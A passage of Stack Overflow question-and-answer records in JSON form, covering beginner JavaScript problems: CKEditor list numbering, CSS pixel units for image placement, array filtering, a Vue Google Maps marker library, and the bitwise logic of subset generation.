list.</p>\n\n<p>This plugin is available only in Full package by default but you can add it manually or using <a href=\"https://ckeditor.com/cke4/builder\" rel=\"nofollow noreferrer\">online builder</a> (which will take care of extra dependencies the plugin may have)</p>\n\n<p><a href=\"https://i.stack.imgur.com/xOmj5.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/xOmj5.png\" alt=\"enter image description here\"></a>\n<a href=\"https://i.stack.imgur.com/V3oeL.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/V3oeL.png\" alt=\"enter image description here\"></a>\n<a href=\"https://i.stack.imgur.com/b8aTw.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/b8aTw.png\" alt=\"enter image description here\"></a></p>\n\n<p>Please note that despite start number change, you will still have two separate lists.</p>\n"}], "owner": {"reputation": 11, "user_id": 4282195, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1c4be335ab1f2b90ea3c504db1717c29?s=128&d=identicon&r=PG&f=1", "display_name": "Eduardo Romo", "link": "https://stackoverflow.com/users/4282195/eduardo-romo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 174, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1558599150, "creation_date": 1558568520, "question_id": 56266317, "link": "https://stackoverflow.com/questions/56266317/is-it-possible-to-continue-numbering-after-inserting-an-image-in-ckeditor", "title": "Is it possible to continue numbering after inserting an image in Ckeditor?", "body": "<p>I'm using the classic version of ckeditor, and want to continue numbering after inserting an image. Let's say the editor content is:</p>\n\n<pre><code>1. AAAA\n2. BBBB\n3. CCCC\n4. DDDD\n</code></pre>\n\n<p>If I insert an image in the second bullet, the numeration changes to:</p>\n\n<pre><code>1. AAAA\n2. BBBB\n   &lt;image&gt;\n1. CCCC\n2. DDDD\n</code></pre>\n\n<p>Is it possible to continue it correctly?</p>\n"}, {"tags": ["javascript"], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 11542093, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-k12H07TJLbI/AAAAAAAAAAI/AAAAAAAAAAA/H7Xhv5xfhPA/photo.jpg?sz=128", "display_name": "Nathan Pham", "link": "https://stackoverflow.com/users/11542093/nathan-pham"}, "edited": false, "score": 0, "creation_date": 1558583541, "post_id": 56266378, "comment_id": 99151304, "body": "I really appreciate the quick response. Thanks for the help (it worked)!"}], "tags": [], "owner": {"reputation": 7965, "user_id": 6504633, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ac20a524c7ab77fee62995c374a1f8a?s=128&d=identicon&r=PG&f=1", "display_name": "obscure", "link": "https://stackoverflow.com/users/6504633/obscure"}, "is_accepted": true, "score": 0, "last_activity_date": 1558569081, "creation_date": 1558569081, "answer_id": 56266378, "question_id": 56266312, "link": "https://stackoverflow.com/questions/56266312/how-to-fix-images-not-rendering-on-the-desired-location/56266378#56266378", "title": "How to Fix Images Not Rendering on the Desired Location", "body": "<p>The problem is that you can't change an elements position by providing a number only.</p>\n\n<pre><code>img.style.left = x;\n</code></pre>\n\n<p>The browser expects a measurement. Since we operate at pixel level you need to append a <strong>px</strong>.</p>\n\n<pre><code>img.style.left = x + \"px\";\nimg.style.top = y + \"px\";\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 11542093, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-k12H07TJLbI/AAAAAAAAAAI/AAAAAAAAAAA/H7Xhv5xfhPA/photo.jpg?sz=128", "display_name": "Nathan Pham", "link": "https://stackoverflow.com/users/11542093/nathan-pham"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 16, "favorite_count": 0, "accepted_answer_id": 56266378, "answer_count": 1, "score": 2, "last_activity_date": 1558569081, "creation_date": 1558568477, "question_id": 56266312, "link": "https://stackoverflow.com/questions/56266312/how-to-fix-images-not-rendering-on-the-desired-location", "title": "How to Fix Images Not Rendering on the Desired Location", "body": "<p>I can't put a tile image onto the screen where I want it to actually go. In this case, I want to have 10 images lined side without any gaps.  </p>\n\n<p>I have attempted to change the values, alter the images, and use the alert function to debug problems, but I can't find the issue (I'm not a very experienced programmer...).  </p>\n\n<pre><code>\"use strict\";\nwindow.onload = function(){\n    var mainContainer = document.getElementById(\"mainContainer\");\n    for(var n = 0; n &lt; 10; n++){\n        drawImageOnSpecifiedPosition(0,n*500,0,mainContainer);  \n    }\n}\n\nfunction setCoords(x, y, img){\n    img.style.position = \"absolute\";\n    img.style.left = x;\n    img.style.top = y;\n}\n\nfunction drawImageOnSpecifiedPosition(whichOne, x, y, whereToAppend){\n    var imageNames = [\n                     \"assets/isometric_pixel_0001.png\",\n                     \"assets/isometric_pixel_0002.png\",\n                     \"assets/isometric_pixel_0003.png\",\n                     \"assets/isometric_pixel_0004.png\",\n                     \"assets/isometric_pixel_0005.png\",\n                     \"assets/isometric_pixel_0006.png\",\n                     \"assets/isometric_pixel_0007.png\",\n                     \"assets/isometric_pixel_0008.png\",\n                     \"assets/isometric_pixel_0009.png\",\n                     \"assets/isometric_pixel_00010.png\"\n    ];\n    var imageToCreate = document.createElement(\"img\");\n    imageToCreate.src = imageNames[whichOne];\n    setCoords(x, y, imageToCreate);\n    whereToAppend.appendChild(imageToCreate);\n}\n\n\n</code></pre>\n\n<p>I expected to have a line of 10 images side by side. However, what I got back was two images slightly displaced. I did not seem to get any error messages when I checked the console either, so I'm assuming the fault lies in my poor programming.</p>\n"}, {"tags": ["javascript", "arrays"], "answers": [{"tags": [], "owner": {"reputation": 4237, "user_id": 10787900, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-4Z6j7Qhowx8/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-ighhCw1JxvK6l7ZVG0ZYElO2DSUA/mo/photo.jpg?sz=128", "display_name": "Bibberty", "link": "https://stackoverflow.com/users/10787900/bibberty"}, "is_accepted": true, "score": 4, "last_activity_date": 1558568599, "creation_date": 1558568599, "answer_id": 56266326, "question_id": 56266301, "link": "https://stackoverflow.com/questions/56266301/get-every-fourth-of-array-and-check-between/56266326#56266326", "title": "Get every fourth of array and check between", "body": "<p>Here, use <code>filter</code></p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>let arr = [ \r\n  { x: 31, y: 8 }, // get 1\r\n  { x: 32, y: 8, monster: { is: true, id: '19216' } }, // get special\r\n  { x: 32, y: 9 },\r\n  { x: 32, y: 10 },\r\n  { x: 32, y: 11 }, // get 4\r\n  { x: 32, y: 12 },\r\n  { x: 32, y: 13 },\r\n  { x: 32, y: 14 },\r\n  { x: 32, y: 15 }, // get 8\r\n  { x: 32, y: 16 }  // get last\r\n];\r\n\r\nlet newArr = arr.filter((e,i,ar) =&gt; (i%4 === 0 || e.monster || i===ar.length-1));\r\n\r\nconsole.log(newArr);</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": [], "owner": {"reputation": 31533, "user_id": 2813224, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/602e78d7da7bd6353c8ee51a17826037?s=128&d=identicon&r=PG", "display_name": "zer00ne", "link": "https://stackoverflow.com/users/2813224/zer00ne"}, "is_accepted": false, "score": 1, "last_activity_date": 1558571489, "creation_date": 1558571489, "answer_id": 56266626, "question_id": 56266301, "link": "https://stackoverflow.com/questions/56266301/get-every-fourth-of-array-and-check-between/56266626#56266626", "title": "Get every fourth of array and check between", "body": "<p>Used <code>.flatMap()</code> to sort out all required objects. A custom function based on this <a href=\"https://stackoverflow.com/a/6700/2813224\">answer</a> counts how many keys each object had so that if an object had more than 2 keys it was considered special.The version in demo is streamlined into one line.</p>\n\n<pre><code>/** objSize(object)\nUtility that returns a given Object's number of non-enumerated property keys it\nhas (String and Symbol). \n*/\nconst objSize = obj =&gt; {\n  let strings = Object.getOwnPropertyNames(obj).length;\n  let symbols = Object.getOwnPropertySymbols(obj).length;\n  return strings + symbols;\n}\n</code></pre>\n\n<p>Further details about <code>.flatMap()</code> are commented in demo.  </p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>let array = [ \r\n  { x: 31, y: 8 }, // get 1\r\n  { x: 32, y: 8, z: { is: true, id: '19216' } }, \r\n  { x: 32, y: 9 },\r\n  { x: 32, y: 10 },\r\n  { x: 32, y: 11 }, // get 4\r\n  { x: 32, y: 12 },\r\n  { x: 32, y: 13 },\r\n  { x: 32, y: 14 },\r\n  { x: 32, y: 15 }, // get 8\r\n  { x: 32, y: 16 }  // get last\r\n];\r\n\r\nconst objSize = obj =&gt; Object.getOwnPropertyNames(obj).length + Object.getOwnPropertySymbols(obj).length;\r\n\r\n/*\r\n.flatMap() is an array method that is basically a\r\ncombonation of `.map()` and `.flat()`. Here it is running \r\na function of 4 ternary controls:\r\n1. if current index is 0: \r\n   (idx === 0) \r\n   return [xy]\r\n2. if current index is a factor of 4: \r\n   (idx % 4 === 0)\r\n   return [xy]\r\n3. if current xy has more than 2 keys:  \r\n   (objSize(xy) &gt; 2)\r\n   return [xy]\r\n4. if current index is the last:\r\n   (idx === array.length - 1)\r\n   return [xy]\r\n5. otherwise return []\r\neach return is an array which is flattened when the final \r\narray is returned. Therefore an empty array is a clean\r\nremoval which means no nulls, spaces, or empty values.\r\n*/\r\nlet result = array.flatMap((xy, idx) =&gt; xy === 0 ? [xy] : idx % 4 === 0 ? [xy] : objSize(xy) &gt; 2 ? [xy] : idx === array.length - 1 ? [xy] : []);\r\n\r\nconsole.log(JSON.stringify(result));</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}], "owner": {"reputation": 2574, "user_id": 11262373, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/168c8af27935ff2587e1a3e9804b5958?s=128&d=identicon&r=PG&f=1", "display_name": "BT101", "link": "https://stackoverflow.com/users/11262373/bt101"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 40, "favorite_count": 0, "accepted_answer_id": 56266326, "answer_count": 2, "score": 2, "last_activity_date": 1558571489, "creation_date": 1558568383, "question_id": 56266301, "link": "https://stackoverflow.com/questions/56266301/get-every-fourth-of-array-and-check-between", "title": "Get every fourth of array and check between", "body": "<p>I have array like this:</p>\n\n<pre><code>let arr = [ \n  { x: 31, y: 8 }, // get 1\n  { x: 32, y: 8, monster: { is: true, id: '19216' } }, // get special\n  { x: 32, y: 9 },\n  { x: 32, y: 10 },\n  { x: 32, y: 11 }, // get 4\n  { x: 32, y: 12 },\n  { x: 32, y: 13 },\n  { x: 32, y: 14 },\n  { x: 32, y: 15 }, // get 8\n  { x: 32, y: 16 }  // get last\n];\n</code></pre>\n\n<p>what I want to achieve is to get every fourth, get special one (the one with monster object) and also last one. So the output would be</p>\n\n<pre><code>[\n {x: 31, y: 8},\n {x: 32, y: 8, monster: { is: true, id: '19216' } },\n {x: 32, y: 11},\n {x: 32, y: 15},\n {x: 32, y: 16}\n]\n</code></pre>\n\n<p>It was easy to get every fourth and last one like this:</p>\n\n<pre><code>let arrThinned = [];\n\nfor (let i = 0; i &lt; arr.length; i = i + 4) {\n  arrThinned.push({\n    x: arr[i].x,\n    y: arr[i].y,\n  });\n}\nif((arr.length - 1) % 4 !== 0) {\n  /* add also last one if not already added */\n  arrThinned.push({\n    x: arr[arr.length - 1].x,\n    y: arr[arr.length - 1].y\n  });\n};\n</code></pre>\n\n<p>but I can't figure out how to additionally check if there is this special one beetwen every fourth and also add it to thinnedArr array. I need to keep the order. <a href=\"https://codepen.io/anon/pen/RmxOZL?editors=0010\" rel=\"nofollow noreferrer\">Demo</a> of above code.</p>\n"}, {"tags": ["javascript", "google-maps", "vue.js", "markerspiderfier"], "answers": [{"tags": [], "owner": {"reputation": 31, "user_id": 10301034, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-5S48wzI-PvA/AAAAAAAAAAI/AAAAAAAAAAA/APUIFaM5LxE9nbAhqCvxfxT5-EbRZExaVw/mo/photo.jpg?sz=128", "display_name": "Elton Lobo", "link": "https://stackoverflow.com/users/10301034/elton-lobo"}, "is_accepted": false, "score": 0, "last_activity_date": 1575824089, "creation_date": 1575824089, "answer_id": 59237651, "question_id": 56266266, "link": "https://stackoverflow.com/questions/56266266/overlappingmarkerspiderfier-is-not-defined-vue-js/59237651#59237651", "title": "OverlappingMarkerSpiderfier is not defined (Vue.js)", "body": "<p>try either 1 of these</p>\n\n<ol>\n<li>this.$nexttick(()=>{\n    code in mounted hook....\n})</li>\n<li>check if window.google object is loaded and your map reference is available before instantiating OverlappingMarkerSpiderfier. </li>\n</ol>\n"}], "owner": {"reputation": 69, "user_id": 7929740, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-5bnMTnSvjVA/AAAAAAAAAAI/AAAAAAAAAEE/BvpuPz0BcMs/photo.jpg?sz=128", "display_name": "chataolauj", "link": "https://stackoverflow.com/users/7929740/chataolauj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 407, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1575824089, "creation_date": 1558567937, "question_id": 56266266, "link": "https://stackoverflow.com/questions/56266266/overlappingmarkerspiderfier-is-not-defined-vue-js", "title": "OverlappingMarkerSpiderfier is not defined (Vue.js)", "body": "<p>I'm trying to implement the OverlappingMarkerSpiderfier for my Google Maps, and it works because my markers are able to \"spiderfy\" when I click on a marker.</p>\n\n<p>My issue is that in my dev console on VS Code, ESLint is still giving me the error 'OverlappingMarkerSpiderfier' is not defined. I don't really know what the issue is since my markers are working as intended when I click on them. Below is a picture showing that OverlappingMarkerWorkers even though there is an error from ESLint:</p>\n\n<p><a href=\"https://i.stack.imgur.com/d7UW4.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/d7UW4.png\" alt=\"enter image description here\"></a></p>\n\n<p>I want to get rid of the error in case a future error arises because of it. I've searched for solutions, and many people have commented that OverlappingMarkerSpiderfier should be loaded after Google Maps load. I've done that, but the error still persists.</p>\n\n<p>I load my Google Maps asynchronously; below is my .js file that loads the Google Maps and OverlappingMarkerSpiderfier:</p>\n\n<pre><code>import api_keys from './api_keys'\n\nconst API_KEY = api_keys.google_maps_api_key;\nconst CALLBACK_NAME = 'gmapsCallback';\n\nlet initialized = !!window.google;\nlet resolveInitPromise;\nlet rejectInitPromise;\n\nconst initPromise = new Promise((resolve, reject) =&gt; {\n  resolveInitPromise = resolve;\n  rejectInitPromise = reject;\n});\n\nexport default function init() {\n  if (initialized) return initPromise;\n\n  initialized = true;\n\n   window[CALLBACK_NAME] = () =&gt; resolveInitPromise(window.google);\n\n   const script = document.createElement('script');\n   script.async = true;\n   script.defer = true;\n   script.src = `https://maps.googleapis.com/maps/api/jskey=${API_KEY}&amp;callback=${CALLBACK_NAME}`;\n   script.onerror = rejectInitPromise;\n   document.querySelector('head').appendChild(script);\n\n   const spiderfier = document.createElement('script');\n   spiderfier.defer = true;\n   spiderfier.src = \"https://cdnjs.cloudflare.com/ajax/libs/OverlappingMarkerSpiderfier/1.0.3/oms.min.js\";\n   spiderfier.onerror = rejectInitPromise;\n   document.querySelector('head').appendChild(spiderfier);\n\n   return initPromise;\n}\n</code></pre>\n\n<p>The following is my GoogleMaps component. The OverlappingMarkerSpiderfier implementation is located within \"watch\":</p>\n\n<pre><code>&lt;template&gt;\n    &lt;div id=\"google-map\"&gt;\n\n    &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\nimport gMaps from '../lib/gMaps.js'\n\nexport default {\n    name: 'GoogleMaps',\n    props: {\n        events: Array\n    },\n    data() {\n        return {\n            map: null,\n            locations: []\n        }\n    },\n    async mounted() {\n        try {\n            const google = await gMaps();\n            const geocoder = new google.maps.Geocoder();\n            this.map = new google.maps.Map(this.$el);\n\n            geocoder.geocode({ address: 'USA'}, (results, status) =&gt; {\n                if (status !== 'OK' || !results[0]) {\n                    throw new Error(status);\n                }\n\n                this.map.setCenter(results[0].geometry.location);\n                this.map.fitBounds(results[0].geometry.viewport);\n            });\n        } catch (error) {\n            console.error(error);\n        }\n    },\n    watch: {\n        async events() { //creates markers for the map; data is from a 3rd party API that is handled by a different component\n            try {\n                const google = await gMaps();\n\n                var oms = new OverlappingMarkerSpiderfier(this.map, {\n                    markersWontMove: true,\n                    markersWontHide: true,\n                    basicFormatEvents: true\n                })\n\n                for(let i = 0; i &lt; this.events.length; i++) {\n                    let marker = new google.maps.Marker({\n                        position: {\n                            lat: parseInt(this.events[i].latitude, 10),\n                            lng: parseInt(this.events[i].longitude, 10)\n                        },\n                        map: this.map,\n                        title: this.events[i].title\n                    })\n\n                    let iw = new google.maps.InfoWindow({\n                        content: this.events[i].description || 'No description available.'\n                    });\n\n                    google.maps.event.addListener(marker, 'spider_click', function() {\n                        iw.open(this.map, marker);\n                    });\n\n                    oms.addMarker(marker);\n                }\n            }\n            catch(error) {\n                console.error(error)\n            }\n        }\n    }\n}\n&lt;/script&gt;\n\n&lt;style lang=\"scss\" scoped&gt;\n#google-map {\n    width: auto;\n    height: 100vh;\n}\n&lt;/style&gt;\n</code></pre>\n"}, {"tags": ["javascript", "function", "math", "combinations", "bitwise-operators"], "answers": [{"comments": [{"owner": {"reputation": 55, "user_id": 11512925, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7abd2b623a30644f9b6c34b293e5c6bf?s=128&d=identicon&r=PG&f=1", "display_name": "icebergflip", "link": "https://stackoverflow.com/users/11512925/icebergflip"}, "edited": false, "score": 0, "creation_date": 1558572348, "post_id": 56266349, "comment_id": 99149402, "body": "Do you know of any resources that may clarify this a bit further? It would be of great use to brush up on this mathematical principle. I appreciate any guidance."}, {"owner": {"reputation": 3129, "user_id": 6656050, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JMh8v.jpg?s=128&g=1", "display_name": "Jeremy Kahan", "link": "https://stackoverflow.com/users/6656050/jeremy-kahan"}, "reply_to_user": {"reputation": 55, "user_id": 11512925, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7abd2b623a30644f9b6c34b293e5c6bf?s=128&d=identicon&r=PG&f=1", "display_name": "icebergflip", "link": "https://stackoverflow.com/users/11512925/icebergflip"}, "edited": false, "score": 1, "creation_date": 1558576741, "post_id": 56266349, "comment_id": 99150152, "body": "The basic idea is that 2^n is the number of subsets of an n-element set. See <a href=\"https://math.stackexchange.com/questions/383485/finding-the-number-of-subsets-of-s\" title=\"finding the number of subsets of s\">math.stackexchange.com/questions/383485/&hellip;</a>"}, {"owner": {"reputation": 55, "user_id": 11512925, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7abd2b623a30644f9b6c34b293e5c6bf?s=128&d=identicon&r=PG&f=1", "display_name": "icebergflip", "link": "https://stackoverflow.com/users/11512925/icebergflip"}, "edited": false, "score": 0, "creation_date": 1558804292, "post_id": 56266349, "comment_id": 99224510, "body": "Thank you so much for clarifying the concept as well as providing reference. You are a scholar my friend."}], "tags": [], "owner": {"reputation": 3129, "user_id": 6656050, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JMh8v.jpg?s=128&g=1", "display_name": "Jeremy Kahan", "link": "https://stackoverflow.com/users/6656050/jeremy-kahan"}, "is_accepted": true, "score": 1, "last_activity_date": 1558568801, "creation_date": 1558568801, "answer_id": 56266349, "question_id": 56266246, "link": "https://stackoverflow.com/questions/56266246/what-is-the-mathematical-reasoning-behind-the-methods-used-in-this-function-that/56266349#56266349", "title": "What is the mathematical reasoning behind the methods used in this function that yields the desired results?", "body": "<p>In general, with n distinct characters taken in order, with some taken or not, there are 2^n possibilities of character sets (including the empty set, which the routine is careful not to add). These are associated with the possible n-digit base 2 numbers who range from 0 to the 2^n-1. Looping through those number, for each number the code checks the bit associated with each character, and includes the character if the bit is 1 and does not if it is 0.</p>\n"}], "owner": {"reputation": 55, "user_id": 11512925, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7abd2b623a30644f9b6c34b293e5c6bf?s=128&d=identicon&r=PG&f=1", "display_name": "icebergflip", "link": "https://stackoverflow.com/users/11512925/icebergflip"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 68, "favorite_count": 0, "accepted_answer_id": 56266349, "answer_count": 1, "score": 1, "last_activity_date": 1558568801, "creation_date": 1558567803, "question_id": 56266246, "link": "https://stackoverflow.com/questions/56266246/what-is-the-mathematical-reasoning-behind-the-methods-used-in-this-function-that", "title": "What is the mathematical reasoning behind the methods used in this function that yields the desired results?", "body": "<p>I have a function that generates all combinations of a giving string; not including permutations. I believe that i fully understand the logic behind how a given string is passed through the function yielding the desired results. What i am looking to understand is the mathematical reasoning behind the main methods by which the function processes the elements of the string into an array that includes all possible combinations.</p>\n\n<p>Here is the heavily commented code which displays my current understanding of the logical processing of the function.</p>\n\n<pre><code>function generateAllCombinationsOfString (str1) { //let str1 = \"dog\"\n    // convert str1 into an array\n    var array1 = []; // create var in order to capture elements of str1 into an array\n        for (var x = 0, y = 1; x &lt; str1.length; x++,y++) {\n            array1[x] = str1.substring(x, y); // we will add each character to array1, in order, starting with the first then ending the loop once the last character has been included in array1\n            // for each iteration: x = 0, y = 1     x &lt; str1.length     x++, y++        array1[x] = str1.substring(x, y)\n            // iteration 1:      x = 0, y = 1         yes                1    2         array1[0] = str1.substring(0, 1) = \"d\"\n            // iteration 2:      x = 1, y = 2       yes                2    3         array1[1] = str1.substring(1, 2) = \"o\"\n            // iteration 3:      x = 2, y = 3       yes                3    4         array1[2] = str1.substring(2, 3) = \"g\"\n            // iteration 4:      x = 3, y = 4       no\n            // end of loop\n        }\n    // create array containing all combinations of str1\n    var combi = []; // create var to capture each possible combination within an array\n    var temp = \"\";  // create cache to temporarily hold elements each possible combination before adding to an array\n    var slent = Math.pow(2, array1.length);\n        for (var i = 0; i &lt; slent; i++){\n            temp = \"\";\n            // for each iteration:      i = 0       i &lt; slent       i++     var combi = []; temp = \"\"; var slent = Math.pow(2, array1.length)\n            // iteration 1:             i = 0         yes            1      var combi = []; temp = \"\"; var slent = Math.pow(2, 3) = 8\n            // iteration 2:             i = 1         yes            2      var combi = [d]; temp = \"\"; var slent = Math.pow(2, 3) = 8\n            // iteration 3:             i = 2         yes            3      var combi = [d, o]; temp = \"\"; var slent = Math.pow(2, 3) = 8\n            // iteration 4:             i = 3         yes            4      var combi = [d, o, do]; temp = \"\"; var slent = Math.pow(2, 3) = 8\n            // iteration 5:             i = 4         yes            5      var combi = [d, o, do, g]; temp = \"\"; var slent = Math.pow(2, 3) = 8\n            // iteration 6:             i = 5         yes            6      var combi = [d, o, do, g, dg]; temp = \"\"; var slent = Math.pow(2, 3) = 8\n            // iteration 7:             i = 6         yes            7      var combi = [d, o, do, g, dg, og]; temp = \"\"; var slent = Math.pow(2, 3) = 8\n            // iteration 8:             i = 7         yes            8      var combi = [d, o, do, g, dg, og, dog]; temp = \"\"; var slent = Math.pow(2, 3) = 8\n            // iteration 9:             i = 8         no\n            // end of loop\n            for (var j = 0; j &lt; array1.length; j++) {\n                if ((i &amp; Math.pow(2, j))) {\n                    temp += array1[j];\n                    // for each iteration:      j = 0       j &lt; array1.length       j++     if((i &amp; Math.pow(2, j)))?                             {temp += array1[j]}\n                    // iteration 1-1:           j = 0         yes                    1      if((0 &amp; Math.pow(2, 0)))? =&gt; if((0 &amp; 1))? // false\n                    // iteration 1-2:           j = 1         yes                    2      if((0 &amp; Math.pow(2, 1)))? =&gt; if((0 &amp; 2))? // false\n                    // iteration 1-3:           j = 2         yes                    3      if((0 &amp; Math.pow(2, 2)))? =&gt; if((0 &amp; 4))? // false\n                    // iteration 1-4:           j = 3         no\n                    // end of loop\n                    // iteration 2-1:           j = 0         yes                    1      if((1 &amp; Math.pow(2, 0)))? =&gt; if((1 &amp; 1))? // true  // {temp += array1[0]} =&gt; temp = \"d\"}\n                    // iteration 2-2:           j = 1         yes                    2      if((1 &amp; Math.pow(2, 1)))? =&gt; if((1 &amp; 2))? // false\n                    // iteration 2-3:           j = 2         yes                    3      if((1 &amp; Math.pow(2, 2)))? =&gt; if((1 &amp; 4))? // false\n                    // iteration 2-4:           j = 3         no\n                    // end of loop\n                    // iteration 3-1:           j = 0         yes                    1      if((2 &amp; Math.pow(2, 0)))? =&gt; if((2 &amp; 1))? // false\n                    // iteration 3-2:           j = 1         yes                    2      if((2 &amp; Math.pow(2, 1)))? =&gt; if((2 &amp; 2))? // true  // {temp += array1[1] =&gt; temp = \"o\"}\n                    // iteration 3-3:           j = 2         yes                    3      if((2 &amp; Math.pow(2, 2)))? =&gt; if((2 &amp; 4))? // false\n                    // iteration 3-4:           j = 3         no\n                    // end of loop\n                    // iteration 4-1:           j = 0         yes                    1      if((3 &amp; Math.pow(2, 0)))? =&gt; if((3 &amp; 1))? // true  // {temp += array1[0] =&gt; temp = \"d\"}\n                    // iteration 4-2:           j = 1         yes                    2      if((3 &amp; Math.pow(2, 1)))? =&gt; if((3 &amp; 2))? // true  // {temp += array1[1] =&gt; temp = \"do\"}\n                    // iteration 4-3:           j = 2         yes                    3      if((3 &amp; Math.pow(2, 2)))? =&gt; if((3 &amp; 4))? // false //\n                    // iteration 4-4:           j = 3         no\n                    // end of loop\n                    // iteration 5-1:           j = 0         yes                    1      if((4 &amp; Math.pow(2, 0)))? =&gt; if((4 &amp; 1))? // false //\n                    // iteration 5-2:           j = 1         yes                    2      if((4 &amp; Math.pow(2, 1)))? =&gt; if((4 &amp; 2))? // false //\n                    // iteration 5-3:           j = 2         yes                    3      if((4 &amp; Math.pow(2, 2)))? =&gt; if((4 &amp; 4))? // true  // {temp += array1[2] =&gt; temp = \"g\"}\n                    // iteration 5-4:           j = 3         no\n                    // end of loop\n                    // iteration 6-1:           j = 0         yes                    1      if((5 &amp; Math.pow(2, 0)))? =&gt; if((5 &amp; 1))? // true  // {temp += array1[0] =&gt; temp = \"d\"}\n                    // iteration 6-2:           j = 1         yes                    2      if((5 &amp; Math.pow(2, 1)))? =&gt; if((5 &amp; 2))? // false //\n                    // iteration 6-3:           j = 2         yes                    3      if((5 &amp; Math.pow(2, 2)))? =&gt; if((5 &amp; 4))? // true  // {temp += array1[2] =&gt; temp = \"dg\"}\n                    // iteration 6-4:           j = 3         no\n                    // end of loop\n                    // iteration 7-1:           j = 0         yes                    1      if((6 &amp; Math.pow(2, 0)))? =&gt; if((6 &amp; 1))? // false // \n                    // iteration 7-2:           j = 1         yes                    2      if((6 &amp; Math.pow(2, 1)))? =&gt; if((6 &amp; 2))? // true  // {temp += array1[1] =&gt; temp = \"o\"}\n                    // iteration 7-3:           j = 2         yes                    3      if((6 &amp; Math.pow(2, 2)))? =&gt; if((6 &amp; 4))? // true  // {temp += array1[2] =&gt; temp = \"og\"}\n                    // iteration 7-4:           j = 3         no         \n                    // end of loop\n                    // iteration 8-1:           j = 0         yes                    1      if((7 &amp; Math.pow(2, 0)))? =&gt; if((7 &amp; 1))? // true  // temp += array1[0] =&gt; temp = \"d\"}\n                    // iteration 8-2:           j = 1         yes                    2      if((7 &amp; Math.pow(2, 1)))? =&gt; if((7 &amp; 2))? // true  // temp += array1[1] =&gt; temp = \"do\"}\n                    // iteration 8-3:           j = 2         yes                    3      if((7 &amp; Math.pow(2, 2)))? =&gt; if((7 &amp; 4))? // true  // temp += array1[2] =&gt; temp = \"dog\"}\n                    // iteration 8-4:           j = 3         no \n                    // end of loop\n                }\n            }\n            if (temp !== \"\") { // if var temp is not an empty string then we add elements of var temp to end of the array var combi at the end of each loop cycle\n                combi.push(temp); \n                // for each iteration       if(temp !== \"\")?\n                // iteration 1:             if(temp !== \"\")? // false //\n                // iteration 2:             if(temp !== \"\")? // true // combi.push(temp) =&gt; combi.push(\"d\") \n                // iteration 3:             if(temp !== \"\")? // true // combi.push(temp) =&gt; combi.push(\"o\") \n                // iteration 4:             if(temp !== \"\")? // true // combi.push(temp) =&gt; combi.push(\"do\")\n                // iteration 5:             if(temp !== \"\")? // true // combi.push(temp) =&gt; combi.push(\"g\")\n                // iteration 6:             if(temp !== \"\")? // true // combi.push(temp) =&gt; combi.push(\"dg\")\n                // iteration 7:             if(temp !== \"\")? // true // combi.push(temp) =&gt; combi.push(\"og\")\n                // iteration 8:             if(temp !== \"\")? // true // combi.push(temp) =&gt; combi.push(\"dog\")\n            }\n        }\n        // join array of combinations while seperating each by a new line\n        console.log(combi.join(\"\\n\"))\n        /*  expected output if str1 = \"dog\"\n\n            d\n            o\n            do\n            g\n            dg\n            og\n            dog\n\n        */\n}\n</code></pre>\n\n<p>Below is the section that includes the pieces that i would like to further understand the reasoning behind.</p>\n\n<pre><code>    var combi = [];\n    var temp = \"\";  \n    var slent = Math.pow(2, array1.length);\n        for (var i = 0; i &lt; slent; i++){\n            temp = \"\";\n\n            for (var j = 0; j &lt; array1.length; j++) {\n                if ((i &amp; Math.pow(2, j))) {\n                    temp += array1[j];\n                }\n            }\n            if (temp !== \"\") { \n                combi.push(temp); \n            }\n        }\n</code></pre>\n\n<p>How is it that the variable \"slent\" with the above definition gives us the exact condition at which the entire loop stops at the right moment after the last possible combinations has been added to the var combi?</p>\n\n<p>furthermore, the second FOR loop in that section also contains a similar condition that works along with the initial expression of j= 0 as well as the condition contained in the IF statement that seems to perfectly process and push each possible combination into the variable \"combi\" while keeping from adding incorrect elements into each iteration. How is it that the Math.pow() methods used in this function yield the desired results?</p>\n\n<p>What is the reasoning behind the 